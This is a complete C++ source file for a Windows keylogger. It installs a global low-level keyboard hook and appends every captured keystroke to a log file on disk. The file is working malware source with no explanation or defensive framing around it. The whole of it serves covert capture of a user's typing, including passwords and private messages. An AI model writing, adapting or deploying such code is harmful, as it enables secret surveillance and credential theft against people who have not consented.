#include <iostream>
#include <Windows.h>
#include <fstream>

using namespace std;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD key = kbdStruct->vkCode;
        ofstream logfile("<path\\to\\store\\keylog.txt>", ios::app);
        if (logfile.is_open()) {
            if ((key >= 39) && (key <= 64) || (key > 64) && (key < 91 && !(GetAsyncKeyState(VK_SHIFT) & 0x8000))) {
                logfile << static_cast<char>((key > 64) ? key + 32 : key);
            } else {
                switch (key) {
                    case VK_SPACE: logfile << " "; break;
                    case VK_RETURN: logfile << "\n"; break;
                    case VK_BACK: logfile << "\b"; break;
                    case VK_TAB: logfile << "\t"; break;
                    default: logfile << "[" << key << "]";
                }
            }
            logfile.close();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) { cout << "Failed to install hook!" << endl; return 1; }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg); DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
    return 0;
}

